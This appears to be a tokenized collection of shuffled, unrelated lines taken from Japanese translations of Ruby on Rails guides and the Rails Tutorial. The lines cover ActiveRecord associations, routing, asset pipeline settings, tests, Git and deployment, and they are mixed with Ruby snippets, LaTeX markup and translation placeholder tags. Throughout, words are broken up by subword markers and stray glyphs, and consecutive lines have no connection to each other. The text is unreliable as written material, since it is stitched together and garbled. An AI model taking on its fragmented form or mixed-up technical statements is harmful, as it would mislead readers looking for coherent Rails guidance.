▁belongs _ to ▁: client , ▁ counter _ cache : ▁true
▁p adding : ▁2 p x ;
▁method _ name ▁= ▁" _ _ bind _ # { time ▖ to _ i } _ # { time ▖ u sec } "
▁ フォローしているユーザー id の 文字列 は以下のようになります 。
▁ サイトの レイアウト に デバッグ情報 を追加する
▁### ▁ サブディレクトリ にデプロイする ▁( 相 対 URL ルート の使用 )
▁ インクルード された CSS によって 生成された HTML ソース 。
▁` classify ` が 返す クラス名 は 文字列 である ことにご注意ください 。
▁* ▁` config ▖ autoload _ once _ paths ` は 、 サーバー への リクエスト ごとに ク リ ア されない 定数 を 自動 読 込 する パス の配列 を引数に取り ます 。
▁config ▖ active _ record ▖ raise _ in _ transaction al _ callback s ▁= ▁true
▁上のように 定義された ビュー は 、 Home 、 Help 、 About ページの 表示 は 以前 と 変わりません が 、 コードの 重複 が 大きく 削 減 されました 。
▁この U S A G E メッセージ は 左 寄 せ で 表示されます 。
▁以下の コマンドを ターミナル で 実行 してください 。
▁\ k ode { full _ title } ヘルパー を使った Web サイトの レイアウト
▁[1, ▁2, ▁3 , ▁4 , ▁5 ]
▁ { | video | ▁ video ▖ category ▁== ▁params [: category ]}
▁ ヘルパーメソッド を 複数の フィクスチャ で使用する には 、 4 ▖ 1 で 新しく 導 入 された ` ActiveRecord :: Fi x t ure S e t ▖ con text _ class ` ▁( ` test _ helper ▖ rb ` ) ▁ に含まれる モジュール で 定義 する必要があります 。
▁end
▁{0} 図 10 ▖ 16 {/0} {1} マイクロポストの 削除リンク と ▁( プロ ト ) ▁ フィード のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / micropost _ delete _ links _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ モデルと モデルの 間 には 関連付け を行なう 必要があります が 、 その 理由 を 御 存 じ でしょうか 。
▁\ k ode { name : string } と \ k ode { email : string } オプション を追加する ことで 、 User モデル の内容 が {1} {2} 図 2▖2 {/2}{/1} の 表 のとおり になるように します
▁リスト \ ref { code : password _ reset _ integration _ test } で使用されている ア イ デ ア の 大 半 は 、 本チュートリアル で 既 出 です ▟ 今回の 新しい 要素 は \ k ode { input } タグ ぐらい でしょう 。
▁たとえば ` to ` メソッドは 、 配列 の冒頭 から 、 渡された インデックス が 示す 箇所 まで の 範囲 を返します 。
▁Rails のような アプリケーションの 場合 、 これは アプリケーションの あらゆる 機能を 一 つ 残 らず 確認し なければならない ということです 。
▁### ▁Active ▁Support を設定する
▁ モジュール が 無名 または トップレベル の場合 、` parent _ name ` は ` nil ` を返します 。
▁ データベース への 接続 は 、 環境変数 ` ENV [' DAT A BASE _ URL ']` を設定する か 、` config / database ▖ yml ` という ファイル を設定する ことで 行えます 。
▁Relationship モデル に対して バリデーション を追加する
▁Rails ▁4 ▖ 2 では 、 これらの インスタンス メソッド呼び出し は ` deliver _ now ` または ` deliver _ later ` が 呼び出される まで 実行 延 期 されます 。
▁ これはリスト \ ref { code : user _ relationships _ association } で使用されていました 。
▁console ▁do
▁まずは ユーザー の一覧を表示 する \ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を見てみましょう ▟ もちろん 、 この時点で はまだ ユーザーは 登録 されていません ▁( 図 \ ref { fig : demo _ blank _ user _ index _ rails _3} ) 。
▁format ▖ text ▁ { ▁render ▁text : ▁' Render ▁text ' ▁ }
▁この 機能 が必要な場合は [ Active ▁Resource ▁gem ]( https :// github ▖ com / rails / active resource ) ▁ を Gemfile に 追加 できます 。
▁ ステータスフィード が追加され 、\ emph { Ruby ▁on ▁Rails チュートリアル } の サンプルアプリケーション が と う と う 完成 しました 。
▁ マイクロポストを ユーザーの \ k ode { show } ページ ▁( プロフィール画面 ) ▁ に追加する
▁リスト \ ref { code : user _ create _ action } のコード によって 、 ユーザー登録フォーム が 実際に 動く ようになりました ▟ これで ブラウザから 正しい ユーザー情報 を 登録 できるようになりました が 、 その前に Web アプリケーションに 常 識 的に 備 わ っている 機能を 追加 してみましょう ▟ 登録 完了 後 に表示される ページに メッセージ を表示し ▁( この場合は 新規ユーザー への ウ ェ ル カ ム メッセージ ) 、2 度 目 以降 には その ページに メッセージ を表示し ないようにする という ものです 。
▁ エンジン も プラグイン も 、 共通の ` lib ` ディレクトリ 構造 を 共有 し 、 どちらも ` rails ▁plugin ▁new ` ジェネレータ を使用して 生成されます 。
▁raise ▁ ArgumentError , ▁" Regexp ▁ multiline ▁option ▁not ▁allow ed ▁in ▁routing ▁requirements : ▁# { require ment ▖ inspect } "
▁Web アプリケーションが 背 後 の OS コマンドを実行 し なければならない 場合 、 Ruby には ` ex ec ( コマンド ) `、` sy s call ( コマンド ) `、` system ( コマンド ) ` 、 そして バ ッ ク ク ォ ート 記 法 という 方法 が 用意されています 。
▁ そのために は 、\ ref { sec : adding _ a _ secure _ password } の 安全 な パスワード の 問題 の ときと同様 の 手法 で これを 解決 します ▟ あのときは 、「 仮 想 の 」 \ k ode { password } 属性 と 、 データベース上の セキュア な \ k ode { password \_ digest } 属性 を使用しました 。
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ k ode { assert } メソッドを使って テスト します ▟\ k ode {@ user ▖ valid ?} が \ k ode { true } を返す と 成功 し 、\ k ode { false } を返す と 失敗します 。
▁def ▁new
▁$ ▁rails ▁generate ▁scaffold ▁User ▁name : string ▁email : string
▁SQL では 、` G R O U P ▁BY ` フィールド で 条件 を指定する 場合に ` HA V IN G ` 句 を使用します 。
▁ 言い 換 え ると 、\ k ode { ▖ center } 冒 頭 の ドット \ k ode { ▖ } は 、 この ルール が クラス に対して スタイル を適用する ことを示しています 。
▁< li >`: authentication ` ▁- ▁ メール サーバー で 認 証 が必要な場合は ここで 認 証 の種類 を指定する 。
▁( 警 告 メッセージ が 若 干 表示される ことがあります が 、 今は 無視 してください 。
▁ フォローしているユーザー と フォロワー を実装する 前に 、 ユーザー と リレーションシップ の関連付け を行います 。
▁ 完全に リファクタリング された ユーザー インデックス 。
▁User モデルに \ k ode { following } の関連付け を追加する
▁ トピックブランチ を 削除 せずに 残 しておけば 、 トピックブランチ と マ ス ター ブランチ を 交 互 に 行 き 来 して 、 き り の 良い 所 で 変更を マージ する 事 が できます 。
▁NOTE : ▁` record ▖ errors [: base ]` に 追加される エラー は 、 概 して 特定の 属性 よりも その レコード 全体 の状態 に 関係 している ものです 。
▁Client ▖ find _ by ▁first _ name : ▁' J on '
▁ ログイン / 記憶トークン / アカウントの有効化 / パスワードの再設定 で 似 ている 点
▁* ▁`: is ` ▁- ▁ 属性 の長さ は 与えられた 値 と 等 しく なければなりません 。
▁#### # ▁` collection ▖ exists ? (▖▖▖)
▁TIP : ▁上の 例 から も わかるように 、 セ パ レ ー タ が 連続 すると 空の 配列 になります 。
▁ 既に アプリケーション 側 のコードは 実装 して あるので 、 このテストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁ ファイル ナ ビ ゲ ー ター 内の 隠 し ファイル を表示する
▁### ▁ バグ レポート を作成する
▁次の 節 では 、 アプリケーションで 新しい 記事 を作成して それ を表示する 機能 を追加しましょう 。
▁< p > Welcome !
▁ Turbolinks は 、 ページ にある すべての ` < a >` に クリック ハンドラ を 1 つ ずつ 追加します 。
▁ 論理値
▁上のコード であれば 、 ブラウザから 改 めて index ページに リクエストが 送信される ので 、` index ` メソッドの コードが 正常に 実行されます 。
▁ テストスイート の実行 では 、 警 告 表示 が オン になります 。
▁API ▁ ドキュメント 作成 ガイドライン
▁\ ref { sec : has _ secure _ password } では 、 よく 使われ る 最 終 検証 として \ emph { 確 認 ▁( confirmation )} を追加します 。
▁<%= ▁javascript _ include _ tag ▁" http :// example ▖ com / main ▖ js " ▁%>
▁ これはリスト \ ref { code : generalized _ authenticated _ p } で使用されていました 。
▁module ▁B us in ess
▁ 「 この 世 には 10 種類の 人 間 が い る ▟ 三項演算子 を 理解 できる 奴 と 、 三項演算子 を 理解 できない 奴 だ ▟ 」 は 、 この 業 界 に 古 く から 伝 わ る ジ ョ ー ク です ▟ なお 、「 10 種類 」 は 2 進 法 なので 10 進 法 で 書 け ば 「 2 種類 」 になります 。
▁ より 多くの パターン を 除 外 する \ k ode { ▖ gitignore } ファイル 。
▁たとえば 以下の 場合 、
▁ 関連付けられている オブジェクトの 1 つ でも 検証 ( validation ) エラー で 保存 に 失敗する と 、 ア サ イン の 式 から は ` false ` が返され 、 ア サ イン は キャン セ ル されます 。
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、 {2} MIME タイプ {/2} で 指定 する ようにします 。
▁この テストが パス するには 、 テスト ファイル 内の ドメイン 名を 正しく 設定 する必要があります ▁( リスト \ ref { code : test _ domain _ host }) 。
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" , ▁nil ] , ▁[" 6 ", ▁"7" , ▁nil ]]
▁self ▁: ▁ qualified _ const _ get ( mod _ name )
▁* ▁`: destroy ` ▁-- ▁ そのオブジェクト が destroy される と 、 関連付けられたオブジェクト に対して ` destroy ` が呼び出され ます 。
▁generate (: scaffold , ▁" person ▁name : string ")
▁* ▁` config ▖ autoload _ paths ` は Rails が 定数 を 自動 読 込 する パス を含む 配列 を引数に取り ます 。
▁ コ ミ ュ ニ テ ィ の メンバー が あなた のコード の 調 整 を 求 め ている のであれば 、 その とおり に して 再 送信する 価 値 があります 。
▁ 以後 、 保存 された コンテンツ を 他の テンプレート や レイアウト で 呼び出す ことができます ▟ 呼び出し の 際に は 、` yield ` の 引数 となる id を 渡します 。
▁もし メールアドレスが 既に 使用されている という メッセージ が表示され たら 、\ ref { sec : signup _ form } で や った ように Rake の \ k ode { db : migrate : reset } ▁ 実行 して データベースをリセットし てください 。
▁` has _ many ` 関連付け が 使用されている 場合 、 その モデルのインスタンス は 、 反 対 側 の モデルの 「 0 個 以上の 」 インスタンス を 所有 します 。
▁\ k ode { div } タグ は 一般的な 表示 領 域 を表し 、 ドキュメント を 別 々 の パ ー ツ に 分ける 以外の ことは しません 。
▁create ▁Rake file
▁------------ --------------- ---------------
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が完成しました ( {0}{1} 第 8 章 {/1}{/0} ) 。
▁Action ▁View ▁ の概要
▁* ▁` ActionDispatch :: Flash ` は ` flash ` キー を設定します 。
▁``` erb
▁ フィンガープリント が 導 入 された ことによって 上 述 の クエリ 文字列 による 問題 点が 解決 され 、 アセット の内容 が 同じ であれば ファイル名 も 常に 同じ になる ようになりました 。
▁cache ▖ write ( join _ asset _ file _ content s ( asset _ paths ) )
▁* ▁`: less _ than ` ▁- ▁ 指定された 値 よりも 小 さ く なければならない こと を指定します 。
▁ユーザー登録 の 確 認
▁### ▁ 変更を コミット する
▁\ k ode { assert _ select } の いくつかの 使用 例
▁self を省略した 結果を リスト \ ref { code : add _ activation _ to _ users _ migration } に示します 。
▁ / signin
▁ 生成された User メイラー
▁\ ref { sec : partial _ refactoring } で 見た 次の コード では 、
▁* ▁** 設定 より 規 約 が 優 先 される ▁( Convention ▁Over ▁Configuration ) : ** ▁Rails では 、 Web アプリケーションで 行われ る さまざまな ことを 実現 するための 最 善 の 方法を 明 確 に 思い 描 い ており 、 Web アプリケーションの 各 種 設定 についても 従来 の 経験 や 慣習 を元に 、 それらの デフォルト値 を 定 め ています ▟ このように ある 種 独 断 で デフォルト値 が 決 ま っている おかげで 、 開発者 の 意 見 をすべて 取り 入 れ ようとした 自 由 過 ぎ る Web アプリケーションの ように 、 開発者 が 延 々 と 設定ファイル を設定し て 回 らず に 済み ます 。
▁{" first _ name "=>" E ile en ", ▁" created _ at "=>" 2013 - 12 - 0 9 ▁ 11 : 22 : 3 5 ▖ 22 1 28 2 "}
▁それでは 、 もう一度 リスト \ ref { code : application _ layout _ redux } に 戻 り 、 レイアウト に ▁CSS ▁( c ascad ing ▁style ▁ sheet ) ▁ を追加する 以下の行 を見てみましょう 。
▁ 場合によっては 、 既に 自分の システム に Ruby が インストール 済み であること も あり えます 。
▁ 拡張 した マイクロポストの データモデル を 、 図 \ ref { fig : micropost _ model _ image } に示します 。
▁application _ controller ▖ rb
▁ ルート ▁( root ) ▁ への ルーティング を定義する 、 コメント 内の ヒント 。
▁( この データ は いずれも \ emph { 有効 では } ありません が 、 fixture 内の サンプル データ は バリデーション を 通 って い なかった ので 今 まで 問題 に はなりません でした ▟)
▁resources ▁: magazine s ▁do
▁次に \ k ode { params } ハッシュ を作成し 、\ k ode { params [: fa the r ]} は \ k ode { person 1 }、\ k ode { params [: m other ]} は \ k ode { person 2 } 、 そして \ k ode { params [: child ]} は ▁\ k ode { person 3 } になるように してください 。
▁( Ruby のインストール は 面倒 が 多く 、 エラー も よく 発生 します ▟ 正 直 、 新しい バージョンの Ruby をインストール する のが 怖 い のですが 、 仕 事 を進める 上で は 避 け て 通 れ ません ) 。
▁ スキーマ ダ ン パ ー は 以下の オプション を追加します 。
▁HTTP /1▖1 ▁ 400 ▁B ad ▁ Request
▁Rails の フォーム 作成 は非常に 簡単です 。
▁ dup [: b ] [: e ] ▁= ▁5
▁` Model ▖ find ( options ) ` という 操作を 要 約 すると 以下の ようになります 。
▁Gemfile の内容は 、 だいたい 図 \ ref { fig : cloud 9 _ gemfile } や リスト \ ref { code : default _ gemfile } のようになります ▟ バージョン番号 など 細 か な 点 で 多少 の違い がある かもしれません 。
▁この マイグレーション は アプリケーション に対して 実行 する必要があります 。
▁[ Create ▁ New ▁or k space ] ▁ を 選択 します 。
▁$ ▁rails ▁console ╼ ▁> > ▁x ▁= ▁1 ╼ ▁=> ▁1 ╼ ▁> > ▁x ▁ += ▁1 ╼ ▁=> ▁2 ╼ ▁> > ▁x ▁* = ▁3 ╼ ▁=> ▁6 ╼ ▁> > ▁x ▁- = ▁ 8 ╼ ▁=> ▁- 2 ╼ ▁> > ▁x ▁ / = ▁2 ╼ ▁=> ▁- 1
▁ コ スト パラメータ の 値を 高 く すれば 、 ハッシュ から オ リ ジ ナ ル の パスワードを 計算 で 推 測 すること が 困難 になります ので 、 production 環境では セキュリティ 上 重要です ▟ しかし テスト 中 は コ スト を 高 く する 意味 は ないので 、\ k ode { digest } メソッドの 計算 は なるべく 軽 く しておきます 。
▁作成した コードをリスト \ ref { code : image _ uploader _ resizing } に示します
▁1 つの アクションは 、 データベース 上で の 特定の CRUD ▁( Create / Re ad / Update / Delete ) ▁ 操作 に 対応 付け られる ルール になっています 。
▁Oh ▁& hell ip ; "
▁このメソッドは 、 フォーム が 送信された ときに ユーザー インターフェイス 上の チェックボックス が オン になっている かどうか を検証します 。
▁このメソッドは ` Date ▖ today ` と似ています が 、 ユーザー 定義 の タイムゾーン がある場合 に それを 考 慮 する 点 が異なります 。
▁ umerate }╼╼ ▁% ▁subsection ▁user _ index ▁( end )╼╼ ▁\ subsection { サンプル のユーザー } ▁% ▁( fold )╼ ▁\ label { sec : sample _ users }╼╼
▁この コンソール は 、 入力 した それぞれの 行 を 評価 した結果 を表示し ており 、 文字列 リテラル の 場合には 文字列 自身 が表示されます 。
▁Ruby や 他の 言語 ▁( C / C + + 、 Perl 、 P H P 、 Java など ) ▁ では 、 上のような フ ロー を より コンパクト な \ emph { 三項演算子 ▁( ternary ▁operator )} ▁ と呼ばれる 表現 で 置き換え ることができます ▁( 3 つの 部分 から 構成 される ため その ように 呼 ば れ ます ) 。
▁class ▁Author ▁< ▁ActiveRecord :: Base
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁この 関連付け は ` author ` という 名前 なので 、` blorgh _ articles ` テーブルに は ` author _ id ` という カラム が追加され る必要があります 。
▁$ ▁git ▁commit ▁- a
▁1 から 3 1 まで の 日付 を オプション に 持ち 、 当 日 が 選択 されている select タグを返します 。
▁#### # ▁`: foreign _ key `
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁ 数 千 の レコード に対して 単 に ループ 処理 を行なう のであれば 通常の 検索 メソッドで 十分です 。
▁ 不 具 合 が発生し た場合 は 、 以下の コマンドを 試 してみてください 。
▁` errors [ ]` は 、 特定の 属性 について エラーメッセージ を チェック したい場合 に 使用します 。
▁use ▁ ActionDispatch :: Re m o te I p
▁javascript _ include _ tag ▁: all , ▁cache : ▁true ▁# ▁=>
▁before _ save ▁ { ▁false ▁ } ▁# ▁ 良い
▁上の ジ ョ ー ク に 倣 えば 、 この 世 には 10 種類の 人 々 が います ▟ 三項演算子 を 好 き な 人 、 嫌 い な 人 、 三項演算子 を 知 らない 人 です 。
▁\ text tt { rails ▁server } を実行し たとき のデフォルトの Rails ページ 。
▁` articles _ path ` のような 通常の ルーティング メソッドの 呼び出し は 、 アプリケーション と エンジン の両方 で そのような ヘルパー が 定義されている 場合には 期 待 と 異なる 場所に リンク される 可能性があります 。
▁しかし その前に 、 削除 を 実行 できる 権限 を持つ 管理ユーザー の クラス を作成し ましょう 。
▁ 完全な ファイルを リスト \ ref { code : layout _ new _ structure } に示します ▟ 続いて 、 これを 構成 している 多くの 部品 について解説します 。
▁デフォルトでは 、 ロケール ファイル にある ロケール キー はすべて 有効 になります が 、 新しい アプリケーションの 場合 、 通常 は `: en ` だけです 。
▁create ▁app / views / layouts / mailer ▖ text ▖ erb
▁デフォルトは ` nil ` です 。
▁ 今回の ケース では 、 特定の リンク が存在する かどうかを 、\ k ode { a } タグ と \ k ode { href } 属性を オプションで 指定 して 調 べ ています ▟ たとえば
▁ paintIt ( this , ▁ backgroundColor , ▁textColor )
▁ _ About ▁your ▁application ' s ▁environment _ ▁ リンクを クリック すれば 、 アプリケーション 環境 の概要 を 確 認 できます 。
▁この バリデーション は 、 あらゆる 種類の 関連付け に対して 使用できます 。
▁上の 行 は 一種の セ フ テ ィ チェック の 役 割 も 果 た し ており 、 う っかり \ k ode { to _ a } メソッド を付け 忘れ たとき の エラー をすべて キャッチ してくれます 。
▁ ログ が ある程度 以上 長い 場合は 、\ k ode { q } キーを 押 して 終 了 します 。
▁F e t ch ing ▁source ▁index ▁for ▁ https :// rubygems ▖ org /
▁# ▁ アセット URL の ダイジェスト を生成する 。
▁\ ref { sec : a _ users _ resource } において 、 REST アーキテクチャ は 、 作成された り 削除され たり する \ emph { リソース } に 関連 して いた ことを思い出してください 。
▁ 前 回 の マイグレーション と同様 、 今回の マイグレーション 名 も \ k ode { \_ to \_ users } で 終 わ っています ▟ これは 、 マイグレーション の 対象 が データベースの \ k ode { users } テーブル であること を Rails に 指示 する ためのものです 。
▁` dasherize ` メソッドは 、 レシーバの アンダースコア 文字 を ダ ッ シ ュ に置き換え ます ( 訳 注 : ▁ ここ で言う ダ ッ シ ュ は 実際には 「 ハイフン マ イ ナ ス 文字 」( U + 00 2 D ) です ) 。
▁m attr _ accessor ▁: author _ class
▁上の 例 で言う と " contributor " や " object " です 。
▁ 残念ながら 、 Rails ▁4▖0 では 技術 的な 理由 により 以下の エラー ページ が表示されます ▟ Rails ▁4▖0 のデフォルト ページ は Heroku では 表示 できません 。
▁ テスティング サイクル の最初の 一 回 し に 取り か か る 前に 、 まずは 現在の テストスイート をそのまま 実行 して 、 問題 なく パス する ことを確認 しておきます 。
▁\ k ode { footer } タグ と \ k ode { ▖ footer } クラスを 両方 使用している こと について 疑 問 に 思 う 方が い る かもしれません 。
▁* ▁Active ▁Record スキーマ における 名前 付け ルール
▁作成した コードをリスト \ ref { code : password _ reset _ form } に示します
▁# ▁Un comment ▁these ▁lines ▁on ▁ Linux ▖
▁# ▁ 与えられた 文字列 の ハッシュ 値 を返す
▁d ▖ beginning _ of _ week (: sunday ) ▁# ▁=> ▁Sun , ▁ 02 ▁May ▁2010
▁### ▁` in ?
▁Person ▖ new ▖ valid ?
▁上のルーティングは 、` / photos ` で始まる パス を 認 識 します が 、 ルーティング 先 を ` Image s ` コントローラに します 。
▁ただし 今 述 べ た ことは 、\ k ode { session } メソッド で作成した 「 一時 セッション 」 に しか 該 当 しません ▟\ k ode { cookies } メソッド で作成した 「 永続的セッション 」 では そこ まで 断 言 は \ emph { できません } 。
▁ パスワード 用の フィールド を作成します ▟ この フィールド への 入力 は マ ス ク 用 文字 で 隠 されます 。
▁` re where ` メソッドは 、 既存の where 条件 を上書き します 。
▁リスト \ ref { code : users _ migration } の場合 、\ k ode { change } メソッドは \ k ode { create _ table } という Rails の メソッドを 呼 び 、 ユーザーを 保存 するための テーブル を データベースに 作成します 。
▁ここで 重要なのは 、\ k ode { send } メソッドの 強 力 き わ ま る 機能 です ▟ このメソッドは 、 与えられた オブジェクト に 「 メッセージ を 送 る 」 ことによって 、 メソッド呼び出し に 自由に 名前 を付け ることができます 。
▁S an it ize Helper モジュール は 、 望 ま しく ない HTML 要素を 除 去 するための メソッド 群 を提供します 。
▁@ customer ▁= ▁@ order ▖ customer
▁* ▁` bootstrap _ hook `: ▁この フック はすべて の設定 済み ` before _ initialize ` ブロック を実行します 。
▁ 一 方 、 Rails は ▁“ ref er r er ” ▁という 正しい ス ペ ル で 使 っています 。
▁ テンプレート 、 パーシャル 、 レイアウト
▁#### ▁collection _ radio _ button s
▁Article ▖ includes (: category , ▁: comments )
▁options ▖ update ( options [: params ] ▖ symbolize _ keys ) ▁if ▁options [: params ]
▁" contact _ data "▖ dasherize ▁# ▁=> ▁" contact - data "
▁ 著者 の場合 、 デフォルトの RDoc を編集する ときには 主 に \ href { http :// d ar ing fi re b all ▖ net / projects / m ar k d own /}{ Markdown } という マークアップ 言語 を使用しています ▟ 拡張子 を \ k ode { ▖ md } に しておけば 、 GitHub に アップロード したときに 自動的に ドキュメント が き れ い に 整 形 されます 。
▁( システム 環境 に依存する 可能性のある gem は コメントアウト されています 。
▁User Mailer ▖ welcome (@ user )▖ deliver _ later
▁@ article ▖ update ▁params [: article ]
▁$ ▁bundle
▁` includes ` メソッドを使用すると 、 その 関連付け が 使用される ときに eager - load ▁( 訳 注 : p reload とは 異なる ) しておきたい 第 2 関連付け を指定することができます 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁even " _ ▁ です 。
▁\ k ode { paginate } を使用することで 、 サンプルアプリケーションの ユーザーの ページネーション を 行える ようになります ▟ 具体的には 、\ k ode { index } アクション 内の \ k ode { all } を \ k ode { paginate } メソッド に置き換え ます ▁( リスト \ ref { code : will _ paginate _ index _ action }) 。
▁README ▖ md ▁| ▁5 ▁+
▁これらの メソッドでは 、 from _ now や ago など を使用した り 、 または Time オブジェクト から 得 た 結果 の 加 減 算 を行なう 際に 、 Time # advance を使用して 正 確 な 日付 計算 を行って います 。
▁ 大きな 違い は 、\ k ode { admin \_ user } フィルター で \ k ode {@ user } 変数 を使う の ではなく 、 関連付け を使って マイクロポスト を見つけ るように している 点 です ▟ これにより 、 ある ユーザーが 他の ユーザーのマイクロポスト を 削除 しようとすると 、 自動的に 失敗する ようになります 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / conversions ▖ rb ` です 。
▁### ▁` index _ by `
▁customer ▖ orders ▖ size ▁# ▁orders の キャッシュ コピー が 使用される
▁\ k ode { user ▖ followed _ users } は ユーザーの 配列 で なければならない ため 、\ k ode { followed _ users } テーブルの それぞれの 行 は 、\ k ode { followed _ id } で 識 別 可能な ユーザー である 必要があります ▟ この 行 には \ k ode { follower _ id } も あり 、 これで 関連付け を行います
▁* ▁` config ▖ assets ▖ compress ` は 、 コンパイル 済み アセットを 圧縮 する かどうか を指定する フラグ です 。
▁これらの 機能 を使用して 、 過 去 に 作成した 最初の ユーザー を探し てみましょう ▟ また 、 3 番目の ユーザー ▁(\ k ode { foo }) ▁ が 削除 されている ことを確認 しましょう 。
▁Client ▖ joins (: orders )▖ where (' orders ▖ created _ at ' ▁=> ▁time _ range )
▁Rails アプリケーションを 実際に Heroku にデプロイする には 、 まず Git を使用して Heroku に リポジトリを プッシュ します 。
▁ この時点で 、( プロ ト ) フィード と その テスト はすべて 動く はずです 。
▁# ▁ 後で 行なう
▁* ▁` render ▁: plain ` を実行すると content ▁type は ` text / plain ` に設定され る
▁ patch ▁: update _ name , ▁on : ▁: member
▁Active ▁Record は 、 レコードが 更新 される たびに ` lock _ version ` カラム の 値を 1 ずつ 増 や します 。
▁作成した コードをリスト \ ref { code : digest _ method } に示します
▁example ▖ com への サインアップ が 成功 しました ▟ ユーザー名 は 「 <%= ▁@ user ▖ login ▁%> 」 です 。
▁` ActiveRecord :: Base ▖ table _ name = ` メソッドを使用して 、 使用 すべき テーブル名 を明示的に指定 できます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / integer / inflections ▖ rb ` です 。
▁また 次のように して 、 ミドルウェア を 読み込み ます 。
▁{0}{1} 第 12 章 {/1}{/0} では 、 マイクロポストの \ emph { フィード } を 受け取る ために 、 ユーザーを \ emph { フォロー } する という 概念 を導入し 、 Twitter の ミ ニ ク ロー ン を 完成させます 。
▁</ table >
▁以下の HTML を生成し ている ことがわかります 。
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App "
▁ コメント にも ある ように 、 上のコード はまだ 実装 が 完了 していません ので 注意してください ▟ しかし 実装 の 出 発 点 としては これで 十分です 。
▁* ▁` ActiveSupport :: D eprecation ▖ silence d ` は 、 非推奨 警 告 メッセージ を表示する かどうかを指定します 。
▁ 破壊的な メソッド ( ` save !` など ) では 、 レコードが 無効な 場合に 例外が発生します 。
▁g ▖ assets ▁false
▁ これが できるように するためには 、 ポ リ モ ー フ ィ ッ ク な インターフェイス を使用する モデル で 、 外部キー の カラム と 型の カラム を 両方 とも 宣言 しておく必要があります 。
▁デフォルトは `: en ` です 。
▁% w () ▖ to _ sentence ▁# ▁=> ▁" "
▁config ▖ assets ▖ debug ▁= ▁false
▁$ ▁ spring ▁stop
▁[] ▖ to ( 7 ) ▁# ▁=> ▁[]
▁`: layout ` などの 追加 オプションを 渡す 場合は 、`: partial ` オプション を明示的に指定 する 必要がある 点 にも ご注意ください 。
▁ 上で 挙 げ た \ k ode { div } タグ の CSS クラス \ k ode { j um bo tr on } や 、 signup ボタン の \ k ode { btn } クラス 、\ k ode { btn - l g } クラス 、\ k ode { btn - primary } クラス はすべて 、 Bootstrap において 特別な 意味 を持ちます 。
▁if ▁textColor ?
▁ _ ルーティング _ ▁ は 、 リクエストを どの コントローラに 割 り 振 る か を 決定 する ためのものです 。
▁この ブロック は 、 レコード と 属性 の名前 、 そして 属性の値 を受け取り ます 。
▁------- ---------------- ----------------
▁#### # ▁`: source `
▁POST ▁ / articles (▖ : format ) ▁articles # create
▁### ▁` abs ence `
▁これは 、 Rails ▁4 ▖ x の 新しい ` secret _ key _ base ` を使用して 署 名 された cookies には Rails ▁3 ▖ x の cookies と の 後 方 互換性 がない ためです 。
▁ 変更 前 :
▁ s ▁the ▁value ▁of ▁the ▁following ▁expression ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - b c 0 d d 6 ' ></ span >╼╼ ▁ %= ▁ lang : ruby ╼ ▁\ begin { code } ╼ ▁ { ▁" a " ▁=> ▁100 , ▁" b " ▁=> ▁200 ▁ } ▖ merge ( { ▁" b " ▁=> ▁30 0 ▁ } )╼ ▁\ end { code }╼\ end { enumerate }╼╼ ▁% ▁subsection ▁hashes _ and _ symbols ▁( end )╼╼ ▁\ subsection { CSS 、 再び } ▁% ▁( fold )╼ ▁\ label { sec : css _ revisited }╼╼
▁ この時点では 、 アプリケーションは Firefox で まだ 正常に 動作する はずです ▟ つまり 、 リスト { p 0} では {2} log _ out {/2} メソッド によって ユーザー ID が 削除され るため 、 ハ イ ラ イ ト されている 2 つの 条件 が {2} false {/2} になります 。
▁def ▁prevent _ delivery _ to _ guest s
▁たとえば 、 ユーザー情報 の メールアドレスが 無効 で 、 パスワードが 短 すぎる 状態 で 保存 し ようとした とします 。
▁ リモート フォーム は ` meta ` タグ から 認 証 を 受け取る ので 、 JavaScript の動作 しない ブラウザ を サポート し なければならない ので なければ トークン の 埋め込み は 不要 です 。
▁User モデル は 問い合わせ を受け 、 すべての ユーザーを データベースから 取り出す 。
▁User ▖ active ▖ inactive
▁ 例として 、 jQuery ライブラリ を使用して Ajax リクエストを送信する CoffeeScript コード を以下に示します 。
▁今度は ` distinct ` を設定し てみましょう 。
▁これで ユーザー登録 / サインイン / サインアウト がすべて 揃 いました ▟ テストスイート は パスするはずです 。
▁` find _ or _ create _ by !` を使用すると 、 新しい レコードが 無効な 場合に 例外を発生 することもできます 。
▁<% ▁@ articles ▖ each ▁do ▁| article | ▁%>
▁このコードは マイクロポスト が 有効 であり 、 かつ \ k ode { user _ id } 属性 が存在し ていること を テスト しています 。
▁User オブジェクト 以外 でも 動作する ように error _ messages パーシャル を更新する
▁ユーザー登録 に 成功 した 画面 のモックアップ
▁これにより 、 ビルトイン の \ k ode { debug } メソッドと \ k ode { params } 変数 を使用して 、 各 プロファイル ページに デバッグ 用の 情報 が表示される ようになります ▁( 詳細については \ ref { sec : a _ users _ resource } で 解説します ) 。
▁ そう かもしれません 。
▁ ちなみに 、\ k ode { private } キーワード 以降 の コードを 強 調 するために 、\ k ode { user \_ params } の インデント を 1 段 深 く して あります 。
▁config ▖ active _ support ▖ test _ order ▁= ▁: s or ted ▁# ▁`: r an dom ` に しても よい
▁< h 1> David ▁H einemeier ▁Hansson </ h 1>
▁TIP : ▁Rails では 、 エラーメッセージ を含む フィールド は自動的に ` field _ with _ errors ` クラス を持つ div タグ で 囲 まれ ます 。
▁第 \ ref { cha : sign _ up } 章では ユーザーを サンプル アプリ に ログイン できるようにします が 、 このとき 、 送信された もの と 一致する メールアドレス の ユーザーの レコードを データベース の中から 探 し だ す 必要があります 。
